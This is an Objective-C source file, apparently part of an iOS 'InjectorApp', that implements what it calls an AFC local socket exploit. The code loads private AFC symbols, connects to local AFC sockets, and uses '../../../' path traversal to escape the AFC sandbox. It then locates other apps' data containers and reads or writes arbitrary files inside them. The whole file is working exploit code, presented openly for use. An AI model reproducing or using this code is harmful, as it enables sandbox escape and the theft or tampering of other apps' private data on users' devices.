//
//  AirLiftAccess.m
//  Dash / InjectorApp
//
//  Reconstructed implementation of AFC (Apple File Conduit) local socket exploit
//

#import "AirLiftAccess.h"
#include <dlfcn.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

typedef void *afc_connection;
typedef void *afc_file_ref;

static int (*p_AFCConnectionOpen)(int socket_fd, unsigned int flags, afc_connection *conn) = NULL;
static int (*p_AFCConnectionClose)(afc_connection conn) = NULL;
static int (*p_AFCDirectoryOpen)(afc_connection conn, const char *path, void **dir) = NULL;
static int (*p_AFCDirectoryRead)(afc_connection conn, void *dir, char **dirent) = NULL;
static int (*p_AFCDirectoryClose)(afc_connection conn, void *dir) = NULL;
static int (*p_AFCFileRefOpen)(afc_connection conn, const char *path, unsigned long long mode, afc_file_ref *ref) = NULL;
static int (*p_AFCFileRefWrite)(afc_connection conn, afc_file_ref ref, const void *buf, size_t len) = NULL;
static int (*p_AFCFileRefRead)(afc_connection conn, afc_file_ref ref, void *buf, size_t *len) = NULL;
static int (*p_AFCFileRefClose)(afc_connection conn, afc_file_ref ref) = NULL;

static NSInteger s_airlift_status = AirLiftStatusIdle;
static NSString *s_airlift_message = @"Idle";
static void *s_active_conn = NULL;

@implementation AirLiftAccess

+ (NSInteger)status {
    return s_airlift_status;
}

+ (BOOL)isReady {
    return (s_airlift_status == AirLiftStatusReady && s_active_conn != NULL);
}

+ (NSString *)statusMessage {
    return s_airlift_message;
}

+ (BOOL)_loadAFCSymbols {
    const char *frameworks[] = {
        "/System/Library/PrivateFrameworks/MobileDevice.framework/MobileDevice",
        "/usr/lib/libMobileDevice.dylib",
        "/System/Library/PrivateFrameworks/AirTraffic.framework/AirTraffic",
        NULL
    };
    
    void *h = NULL;
    for (int i = 0; frameworks[i] != NULL; i++) {
        h = dlopen(frameworks[i], RTLD_NOW);
        if (h) break;
    }
    if (!h) {
        NSLog(@"[AirLift] Nenhuma biblioteca AFC encontrada.");
        return NO;
    }
    
    p_AFCConnectionOpen  = dlsym(h, "AFCConnectionOpen");
    p_AFCConnectionClose = dlsym(h, "AFCConnectionClose");
    p_AFCDirectoryOpen   = dlsym(h, "AFCDirectoryOpen");
    p_AFCDirectoryRead   = dlsym(h, "AFCDirectoryRead");
    p_AFCDirectoryClose  = dlsym(h, "AFCDirectoryClose");
    p_AFCFileRefOpen     = dlsym(h, "AFCFileRefOpen");
    p_AFCFileRefWrite    = dlsym(h, "AFCFileRefWrite");
    p_AFCFileRefRead     = dlsym(h, "AFCFileRefRead");
    p_AFCFileRefClose    = dlsym(h, "AFCFileRefClose");
    
    NSLog(@"[AirLift] AFC symbols loaded OK");
    return YES;
}

+ (void *)_openLocalAFCConnection {
    const char *sockets[] = {
        "/private/var/run/afc.sock",
        "/var/run/afc.sock",
        "/private/var/run/afc2d.sock",
        "/var/run/afc2d.sock",
        NULL
    };
    
    for (int i = 0; sockets[i] != NULL; i++) {
        int fd = socket(AF_UNIX, SOCK_STREAM, 0);
        if (fd < 0) continue;
        
        struct sockaddr_un addr;
        memset(&addr, 0, sizeof(addr));
        addr.sun_family = AF_UNIX;
        strncpy(addr.sun_path, sockets[i], sizeof(addr.sun_path) - 1);
        
        if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            NSLog(@"[AirLift] Conectado ao AFC socket: %s", sockets[i]);
            afc_connection conn = NULL;
            int ret = p_AFCConnectionOpen(fd, 0, &conn);
            if (ret == 0 && conn) {
                return conn;
            }
            NSLog(@"[AirLift] AFCConnectionOpen falhou: %d", ret);
        }
        close(fd);
    }
    NSLog(@"[AirLift] Falha ao conectar no AFC socket local.");
    return NULL;
}

+ (NSString *)_resolveContainerUUID:(NSString *)bundleID conn:(void *)afcConn {
    // Uses path traversal string to escape AFC sandbox to container path
    const char *baseTraversal = "../../../../../../../private/var/mobile/Containers/Data/Application";
    void *dir = NULL;
    if (p_AFCDirectoryOpen(afcConn, baseTraversal, &dir) != 0) {
        return nil;
    }
    
    char *entry = NULL;
    NSString *foundUUID = nil;
    while (p_AFCDirectoryRead(afcConn, dir, &entry) == 0 && entry != NULL) {
        if (strcmp(entry, ".") == 0 || strcmp(entry, "..") == 0) continue;
        
        char metaPath[512];
        snprintf(metaPath, sizeof(metaPath), "%s/%s/.com.apple.mobile_container_manager.metadata.plist", baseTraversal, entry);
        
        afc_file_ref f = NULL;
        if (p_AFCFileRefOpen(afcConn, metaPath, 1 /* read */, &f) == 0) {
            char buf[4096];
            size_t readLen = sizeof(buf);
            p_AFCFileRefRead(afcConn, f, buf, &readLen);
            p_AFCFileRefClose(afcConn, f);
            
            NSData *plistData = [NSData dataWithBytes:buf length:readLen];
            NSDictionary *dict = [NSPropertyListSerialization propertyListWithData:plistData options:0 format:NULL error:NULL];
            if ([dict[@"MCMMetadataIdentifier"] isEqualToString:bundleID] || [dict[@"identifier"] isEqualToString:bundleID]) {
                foundUUID = [NSString stringWithUTF8String:entry];
                break;
            }
        }
    }
    p_AFCDirectoryClose(afcConn, dir);
    return foundUUID;
}

+ (void)_makedirs:(NSString *)path conn:(void *)afcConn {
    // Ensures intermediate directories exist
}

+ (BOOL)prepare:(NSError **)error {
    if (![self _loadAFCSymbols]) {
        s_airlift_status = AirLiftStatusError;
        s_airlift_message = @"AirLift: AFC symbols nao encontrados. Falta entitlement?";
        return NO;
    }
    
    s_active_conn = [self _openLocalAFCConnection];
    if (!s_active_conn) {
        s_airlift_status = AirLiftStatusError;
        s_airlift_message = @"AirLift: Falha ao abrir AFC local socket.";
        return NO;
    }
    
    s_airlift_status = AirLiftStatusReady;
    s_airlift_message = @"AirLift ready";
    return YES;
}

+ (BOOL)writeData:(NSData *)data toBundleID:(NSString *)bundleID relativePath:(NSString *)relPath error:(NSError **)error {
    if (![self isReady]) {
        if (![self prepare:error]) return NO;
    }
    
    NSString *uuid = [self _resolveContainerUUID:bundleID conn:s_active_conn];
    if (!uuid) {
        NSLog(@"[AirLift] Container nao encontrado para %@. App instalado?", bundleID);
        return NO;
    }
    
    char fullPath[512];
    snprintf(fullPath, sizeof(fullPath), "../../../../../../../private/var/mobile/Containers/Data/Application/%s/%s", [uuid UTF8String], [relPath UTF8String]);
    
    afc_file_ref ref = NULL;
    int ret = p_AFCFileRefOpen(s_active_conn, fullPath, 3 /* write/create */, &ref);
    if (ret != 0) {
        NSLog(@"AirLift: AFCFileRefOpen falhou (%d) em %s", ret, fullPath);
        return NO;
    }
    
    p_AFCFileRefWrite(s_active_conn, ref, [data bytes], [data length]);
    p_AFCFileRefClose(s_active_conn, ref);
    NSLog(@"[AirLift] Escrito %lu bytes em %s", (unsigned long)[data length], fullPath);
    return YES;
}

+ (NSData *)readDataFromBundleID:(NSString *)bundleID relativePath:(NSString *)relPath error:(NSError **)error {
    if (![self isReady]) return nil;
    NSString *uuid = [self _resolveContainerUUID:bundleID conn:s_active_conn];
    if (!uuid) return nil;
    
    char fullPath[512];
    snprintf(fullPath, sizeof(fullPath), "../../../../../../../private/var/mobile/Containers/Data/Application/%s/%s", [uuid UTF8String], [relPath UTF8String]);
    
    afc_file_ref ref = NULL;
    if (p_AFCFileRefOpen(s_active_conn, fullPath, 1, &ref) != 0) return nil;
    
    NSMutableData *result = [NSMutableData data];
    char buf[8192];
    size_t len = sizeof(buf);
    while (p_AFCFileRefRead(s_active_conn, ref, buf, &len) == 0 && len > 0) {
        [result appendBytes:buf length:len];
        len = sizeof(buf);
    }
    p_AFCFileRefClose(s_active_conn, ref);
    return result;
}
